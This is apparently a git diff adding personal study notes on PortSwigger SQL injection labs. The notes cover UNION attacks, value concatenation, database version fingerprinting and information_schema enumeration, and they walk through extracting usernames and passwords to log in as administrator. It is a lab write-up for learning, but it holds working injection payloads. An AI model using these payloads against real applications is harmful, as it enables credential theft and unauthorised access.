@@ -201,3 +201,192 @@ In this example, you can retrieve the contents of the `users` table by submittin
 
 In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.
 
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
+
+The database contains a different table called `users`, with columns called `username` and `password`.
+
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
+
+![[Pasted image 20240623093551.png]]
+
+Again here we have just used ctl+u to URL encode our payload:
+
+```
+' UNION SELECT username, password FROM users--
+```
+
+---
+
+## Retrieving multiple values within a single column
+
+In some cases the query in the previous example may only return a single column.
+
+You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
+
+`' UNION SELECT username || '~' || password FROM users--`
+
+This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.
+
+The results from the query contain all the usernames and passwords, for example:
+
+```
+... 
+administrator~s3cure 
+wiener~peter 
+carlos~montoya 
+...
+```
+
+Different databases use different syntax to perform string concatenation. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a different table called `users`, with columns called `username` and `password`.
+
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
+
+![[Pasted image 20240623101923.png]]
+
+I kept getting a server error because i didn't have the null in place which meant it was creating an error because, to my understanding, it has 3 columns, so you have to include it. 
+
+---
+
+## Examining the database in SQL injection attacks
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+- The type and version of the database software.
+- The tables and columns that the database contains.
+
+## Querying the database type and version
+
+You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
+
+The following are some queries to determine the database version for some popular database types:
+
+|                  |                           |
+| ---------------- | ------------------------- |
+| Database type    | Query                     |
+| Microsoft, MySQL | `SELECT @@version`        |
+| Oracle           | `SELECT * FROM v$version` |
+| PostgreSQL       | `SELECT version()`        |
+
+For example, you could use a `UNION` attack with the following input:
+
+`' UNION SELECT @@version--`
+
+This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
+
+`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)` 
+`Mar 18 2018 09:11:49`
+`Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server` `2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`
+
+This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+![[Pasted image 20240623105709.png]]
+
+![[Pasted image 20240623105739.png]]
+
+## Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query `information_schema.tables` to list the tables in the database:
+
+`SELECT * FROM information_schema.tables`
+
+This returns output like the following:
+
+`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== 
+`MyDatabase dbo Products BASE TABLE 
+`MyDatabase dbo Users BASE TABLE 
+`MyDatabase dbo Feedback BASE TABLE`
+
+This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
+
+You can then query `information_schema.columns` to list the columns in individual tables:
+
+`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+
+This returns output like the following:
+
+`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= 
+`MyDatabase dbo Users UserId int 
+`MyDatabase dbo Users Username varchar 
+`MyDatabase dbo Users Password varchar`
+
+This output shows the columns in the specified table and the data type of each column.
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the `administrator` user.
+
+```
+' UNION SELECT * FROM information_schema.tables
+```
+
+```
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+First i determine the number of columns in the database
+
+```
+'+UNION+SELECT+NULL,NULL--
+```
+
+Identify the database type, and don't forget to add the NULL for extra columns.
+
+![[Pasted image 20240623112633.png]]
+
+Now modify the request to make a query 
+
+I locate the correct command for postgreSQL
+
+```
+SELECT * FROM information_schema.tables
+```
+
+I look at the information about column naming.
+https://www.postgresql.org/docs/current/information-schema.html
+
+`table_name` `sql_identifier`
+`Name of the table`
+
+So `SELECT * FROM information_schema.tables` becomes:
+
+```
+UNION SELECT table_name,NULL FROM information_schema.tables--
+```
+
+We select null because we don't care about the second column. 
+
+![[Pasted image 20240623114054.png]]
+
+target:users_kzfpws
+
+We now need to know the column names which we can get from the same website as before.
+
+![[Pasted image 20240623120249.png]]
+
+Column names:
+
+```
+username_sdqalg
+password_egbijt
+```
+
+Now that we have the table and column name, we can enumerate all the users and passwords.
+
+```
+' UNION SELECT username_sdqalg,password_egbijt FROM users_kzfpws--
+```
+
+![[Pasted image 20240623120931.png]]
+
+---
+
